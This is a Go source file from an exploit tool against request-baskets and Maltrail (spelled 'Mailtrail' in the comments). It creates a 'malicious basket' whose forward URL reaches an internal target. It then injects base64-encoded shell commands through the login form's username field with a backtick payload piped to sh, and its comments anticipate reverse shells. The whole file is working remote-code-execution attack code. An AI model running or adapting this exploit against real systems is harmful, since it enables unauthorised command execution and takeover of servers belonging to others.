package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"os"

	"github.com/thomas-osgood/OGOR/misc/generators"
)

// function desinged to execute a given command on the target
// machine. this needs to be called after both the
// MakeMaliciousBasket and OpenMaliciousBasket functions.
func (e *Exploiter) ExecuteCommand(command string) (err error) {
	var b64command string
	var commandPayload string = ";`echo+\"%s\" | base64 -d | sh`"
	var payload url.Values = url.Values{}
	var resp *http.Response
	var targeturl string

	targeturl = fmt.Sprintf("%s/%s/login", e.baseurl, e.basketName)

	b64command = base64.StdEncoding.EncodeToString([]byte(command))
	commandPayload = fmt.Sprintf(commandPayload, b64command)

	payload.Set("username", commandPayload)

	resp, err = e.client.PostForm(targeturl, payload)
	if err != nil {
		// if the error is a timeout, assume the command is
		// long-running or a reverse shell of some kind and
		// do not return an error.
		if os.IsTimeout(err) {
			return nil
		} else {
			return err
		}
	}
	defer resp.Body.Close()

	return nil
}

// function designed to create a new, malicious, basket
// by calling the Mailtrail API. this will setup the
// forward url to be the target machine, allowing for
// remote code execution on the target.
func (e *Exploiter) MakeMaliciousBasket() (err error) {
	var payload MailtrailPayload = MailtrailPayload{}
	var payloadbytes []byte
	var req *http.Request
	var resp *http.Response
	var targeturl string

	e.basketName, err = generators.GenRandomName(5, 10)
	if err != nil {
		return err
	}

	payload.Capacity = DEFAULT_CAPACITY
	payload.ExpandPath = EXPAND_PATH_VALUE
	payload.ForwardUrl = FORWARD_URL
	payload.Insecure = INSECURE_VALUE
	payload.ProxyResponse = PROXY_RESPONSE_VALUE

	payloadbytes, err = json.Marshal(&payload)
	if err != nil {
		return err
	}

	targeturl = fmt.Sprintf("%s/%s/%s", e.baseurl, BASE_BASKETS_ROUTE, e.basketName)

	req, err = http.NewRequest(http.MethodPost, targeturl, bytes.NewBuffer(payloadbytes))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", JSON_CONTENT_TYPE)

	resp, err = e.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= http.StatusBadRequest {
		return errors.New(fmt.Sprintf("error creating malicious basket: %s", resp.Status))
	}

	return nil
}

// function designed to navigate to the malicious basket
// created by MakeMaliciousBasket to allow for RCE.
func (e *Exploiter) OpenMaliciousBasket() (err error) {
	var resp *http.Response
	var targeturl string

	targeturl = fmt.Sprintf("%s/%s", e.baseurl, e.basketName)

	resp, err = e.client.Get(targeturl)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= http.StatusBadRequest {
		return errors.New(fmt.Sprintf("error navigating to basket: %s", resp.Status))
	}

	return nil
}
